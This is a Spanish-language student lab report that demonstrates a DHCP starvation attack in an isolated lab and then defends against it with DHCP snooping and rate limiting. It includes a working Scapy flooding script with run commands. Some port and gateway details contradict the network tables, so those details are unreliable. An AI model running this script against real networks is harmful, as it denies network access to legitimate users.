# Ataque DHCP Starvation
**Nombre:** Henry Vicente Quezada | **Matrícula:** 2025-1332 | **Fecha:** Junio 2026

---

## 🎬 Video Demostrativo
https://youtu.be/1omdjGjq42A?list=PLhmycmsx2nBtM_kPjpLdj-vl3sWWjShMS
---

## 1. Objetivo del Laboratorio
Demostrar cómo un atacante puede agotar el pool de direcciones IP del servidor DHCP enviando miles de solicitudes con MACs aleatorias, dejando sin servicio a los clientes legítimos, y aplicar DHCP Snooping con rate limiting como contramedida.

---

## 2. Objetivo del Script
Enviar masivamente solicitudes DHCP Discover con MACs falsas aleatorias para consumir todas las IPs disponibles en el pool del servidor DHCP, impidiendo que dispositivos legítimos obtengan direccionamiento.

### 2.1 Parámetros Usados
| Parámetro | Descripción | Valor por defecto |
|---|---|---|
| `interfaz` | Interfaz de red del atacante | Requerido (ej: `eth0`) |
| `cantidad` | Número de solicitudes a enviar | 500 |
| `delay` | Tiempo entre paquetes (segundos) | 0.1 |

### 2.2 Requisitos
- Sistema operativo: **Kali Linux**
- Python 3.x
- Librería Scapy: `pip install scapy`
- Permisos de root: `sudo`
- Conectividad en la misma red que el servidor DHCP

---

## 3. Funcionamiento del Script
1. Genera una MAC aleatoria por cada solicitud
2. Construye un paquete DHCP Discover con esa MAC como dirección de hardware
3. Envía el paquete como broadcast UDP (puerto 68 → 67)
4. El servidor DHCP asigna una IP a cada MAC recibida
5. Repite hasta agotar el pool completo
6. Muestra el progreso cada 50 paquetes enviados

```bash

Crear y guardar el script:
bash
nano /home/kali-linux/dhcp_starvation.py

Pega el contenido del script, luego guarda con Ctrl+O → Enter → Ctrl+X

Dar permisos de ejecución:
bash
chmod +x /home/kali-linux/dhcp_starvation.py

Pasos de ejecución
Paso 1 — R1: Ver pool DHCP antes del ataque
bash
show ip dhcp pool
show ip dhcp binding

Paso 2 — Kali: Ejecutar el ataque
bash
sudo python3 /home/kali-linux/dhcp_starvation.py eth0 300

Paso 3 — R1: Ver pool agotado
bash
show ip dhcp pool
show ip dhcp binding

Paso 4 — VPC1: Intentar obtener IP
bash
ip dhcp

Debe fallar porque el pool está agotado ✅

Paso 5 — SW1: Aplicar contramedida
bash
conf t
ip dhcp snooping
ip dhcp snooping vlan 10
ip dhcp snooping vlan 20
no ip dhcp snooping information option
interface e0/0
 ip dhcp snooping trust
exit
interface e0/3
 ip dhcp snooping limit rate 15
exit
end
write memory

Paso 6 — R1: Limpiar bindings
bash
clear ip dhcp binding *

Paso 7 — Kali: Ejecutar ataque de nuevo
bash
sudo python3 /home/kali-linux/dhcp_starvation.py eth0 300

Paso 8 — SW1: Verificar bloqueo
bash
show ip dhcp snooping statistics

Paso 9 — VPC1: Obtener IP correctamente
bash
ip dhcp
show ip

Gateway debe mostrar 10.13.32.1 ← R1 real ✅


🐍 Script — dhcp_starvation.py
python#!/usr/bin/env python3
# =============================================================
# Nombre:     Henry Vicente Quezada
# Matricula:  2025-1332
# Ataque:     DHCP Starvation - Pool Exhaustion
# Fecha:      2026
# =============================================================
from scapy.all import *
import random
import time
import sys

def random_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(6)
    )

def dhcp_starvation(iface, count=500, delay=0.1):
    print("=" * 55)
    print("       ATAQUE DHCP STARVATION")
    print("       Autor: Henry Vicente Quezada")
    print("       Matricula: 2025-1332")
    print("=" * 55)
    print(f"[*] Interfaz : {iface}")
    print(f"[*] Paquetes : {count}")
    print(f"[*] Iniciando ataque...\n")

    for i in range(count):
        mac = random_mac()
        mac_bytes = bytes.fromhex(mac.replace(":", ""))
        pkt = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac_bytes + b'\x00' * 10,
                  xid=random.randint(1, 0xFFFFFFFF)) /
            DHCP(options=[("message-type","discover"),
                ("hostname",f"host{random.randint(100,999)}"),"end"])
        )
        sendp(pkt, iface=iface, verbose=False)
        if (i+1) % 50 == 0:
            print(f"[+] Solicitudes enviadas: {i+1}/{count}")
        time.sleep(delay)

    print(f"\n[+] Completado. {count} solicitudes enviadas.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("\nUso: sudo python3 dhcp_starvation.py <interfaz> [cantidad]")
        sys.exit(1)
    iface = sys.argv[1]
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 500
    dhcp_starvation(iface, count)

🛡️ Contramedida aplicada

DHCP Snooping con limitación de tasa en SW1:
SW1(config)# ip dhcp snooping
SW1(config)# ip dhcp snooping vlan 10
SW1(config)# ip dhcp snooping vlan 20
SW1(config)# no ip dhcp snooping information option
SW1(config)# interface e0/0
SW1(config-if)# ip dhcp snooping trust
SW1(config)# interface e0/3
SW1(config-if)# ip dhcp snooping limit rate 15
SW1(config)# end
SW1# write memory

! Verificación
SW1# show ip dhcp snooping statistics
SW1# show ip dhcp snooping
```

---

## 4. Documentación de la Red

### Topología
<img width="648" height="556" alt="image" src="https://github.com/user-attachments/assets/ecade9a5-9d38-4994-a388-962dad06f919" />

## Tabla de Interfaces por Dispositivo

| Dispositivo | Interfaz | VLAN | IP | Máscara | Descripción |
|---|---|---|---|---|---|
| ISP | e0/0 | WAN | 200.13.32.1 | /30 | Enlace hacia R1 |
| R1 | e0/3 | WAN | 200.13.32.2 | /30 | Enlace hacia ISP (NAT Outside) |
| R1 | e0/0 | WAN | 10.13.32.1 | /30 | Enlace hacia R2 (OSPF) |
| R1 | e0/1 | Trunk | — | — | Trunk hacia SW1 |
| R1 | e0/1.10 | 10 | 10.13.10.1 | /24 | Gateway VLAN 10 Usuarios |
| R1 | e0/1.99 | 99 | 10.13.99.1 | /28 | Gateway Gestión SW1 |
| R1 | e0/1.999 | 999 | — | — | VLAN Nativa |
| R1 | e0/2 | Trunk | — | — | Trunk hacia SW2 |
| R1 | e0/2.20 | 20 | 10.13.20.1 | /24 | Gateway VLAN 20 Administración |
| R1 | e0/2.99 | 99 | 10.13.99.17 | /28 | Gateway Gestión SW2 |
| R1 | e0/2.999 | 999 | — | — | VLAN Nativa |
| R2 | e0/0 | WAN | 10.13.32.2 | /30 | Enlace hacia R1 (OSPF) |
| R2 | e0/1 | Trunk | — | — | Trunk hacia SW3 |
| R2 | e0/1.30 | 30 | 10.13.30.1 | /24 | Gateway VLAN 30 Servicios |
| R2 | e0/1.99 | 99 | 10.13.99.33 | /28 | Gateway Gestión SW3 |
| R2 | e0/1.999 | 999 | — | — | VLAN Nativa |
| R2 | e0/2 | Trunk | — | — | Trunk hacia SW4 |
| R2 | e0/2.40 | 40 | 10.13.40.1 | /24 | Gateway VLAN 40 Invitados |
| R2 | e0/2.99 | 99 | 10.13.99.49 | /28 | Gateway Gestión SW4 |
| R2 | e0/2.999 | 999 | — | — | VLAN Nativa |
| SW1 | VLAN 99 | 99 | 10.13.99.2 | /28 | Gestión Switch |
| SW2 | VLAN 99 | 99 | 10.13.99.18 | /28 | Gestión Switch |
| SW3 | VLAN 99 | 99 | 10.13.99.34 | /28 | Gestión Switch |
| SW4 | VLAN 99 | 99 | 10.13.99.50 | /28 | Gestión Switch |
| PC-Usuarios | eth0 | 10 | DHCP | /24 | Cliente VLAN 10 |
| Kali Linux | eth0 | 10 | 10.13.10.5 | /24 | Equipo Kali Linux |
| PC-Administración | eth0 | 20 | DHCP | /24 | Cliente VLAN 20 |
| Servidor | eth0 | 30 | DHCP | /24 | Cliente VLAN 30 |
| PC-Invitados | eth0 | 40 | DHCP | /24 | Cliente VLAN 40 |

## Pools DHCP

| Pool | Red | Gateway | Rango Disponible | Excluidos |
|---|---|---|---|---|
| VLAN10_USUARIOS | 10.13.10.0/24 | 10.13.10.1 | 10.13.10.11 - 10.13.10.254 | 10.13.10.1 - 10.13.10.10 |
| VLAN20_ADMIN | 10.13.20.0/24 | 10.13.20.1 | 10.13.20.11 - 10.13.20.254 | 10.13.20.1 - 10.13.20.10 |
| VLAN30_SERVICIOS | 10.13.30.0/24 | 10.13.30.1 | 10.13.30.11 - 10.13.30.254 | 10.13.30.1 - 10.13.30.10 |
| VLAN40_INVITADOS | 10.13.40.0/24 | 10.13.40.1 | 10.13.40.11 - 10.13.40.254 | 10.13.40.1 - 10.13.40.10 |

## Interfaces de Acceso y Troncales

| Dispositivo | Puerto | Modo | VLAN | Conectado a |
|---|---|---|---|---|
| SW1 | e0/0 | Trunk 802.1Q | 10,99,999 | R1 |
| SW1 | e0/1 | Access | 10 | PC Usuarios |
| SW1 | e0/2 | Access | 10 | Kali Linux |
| SW2 | e0/0 | Trunk 802.1Q | 20,99,999 | R1 |
| SW2 | e0/1 | Access | 20 | PC Administración |
| SW3 | e0/0 | Trunk 802.1Q | 30,99,999 | R2 |
| SW3 | e0/1 | Access | 30 | Servidor |
| SW4 | e0/0 | Trunk 802.1Q | 40,99,999 | R2 |
| SW4 | e0/1 | Access | 40 | PC Invitados |

## VLANs Implementadas

| VLAN | Nombre | Red | Gateway |
|---|---|---|---|
| 10 | Usuarios | 10.13.10.0/24 | 10.13.10.1 |
| 20 | Administración | 10.13.20.0/24 | 10.13.20.1 |
| 30 | Servicios | 10.13.30.0/24 | 10.13.30.1 |
| 40 | Invitados | 10.13.40.0/24 | 10.13.40.1 |
| 99 | Administración de Equipos | 10.13.99.0/28, 10.13.99.16/28, 10.13.99.32/28, 10.13.99.48/28 | Según segmento |
| 999 | VLAN Nativa No Utilizada | N/A | N/A |

---

## 5. Capturas de Pantalla

### Antes del ataque
<img width="731" height="493" alt="image" src="https://github.com/user-attachments/assets/c280306d-acb6-4ce8-8f5b-95f7aa87f573" />

> 📷 `R1# show ip dhcp binding` — pocas IPs asignadas

### Script en ejecución
 <img width="639" height="475" alt="image" src="https://github.com/user-attachments/assets/fe176c2a-43ec-4ec2-a91b-867be5d51a38" />

> 📷 Kali ejecutando `dhcp_starvation.py` mostrando solicitudes enviadas

### Pool agotado
<img width="630" height="469" alt="image" src="https://github.com/user-attachments/assets/cb452888-4bf7-4cce-a4ac-07aa92ef8616" />

> 📷 `R1# show ip dhcp binding` — pool agotado con MACs falsas

### Cliente sin IP
<img width="537" height="430" alt="image" src="https://github.com/user-attachments/assets/48517c61-50a6-45eb-aa5d-ef9b5791b725" />

> 📷 `VPC10# ip dhcp` — falla por pool agotado

### Contramedida aplicada
<img width="572" height="363" alt="image" src="https://github.com/user-attachments/assets/db7c01c6-7cb4-47ec-b9b7-6756a4caeeb1" />

> 📷 `SW1# show ip dhcp snooping statistics` — bloqueando solicitudes excesivas

```

El rate limiting limita a 15 solicitudes DHCP por segundo en el puerto e0/3. Si Kali supera ese límite, el puerto se deshabilita automáticamente, impidiendo que el atacante agote el pool del servidor DHCP.
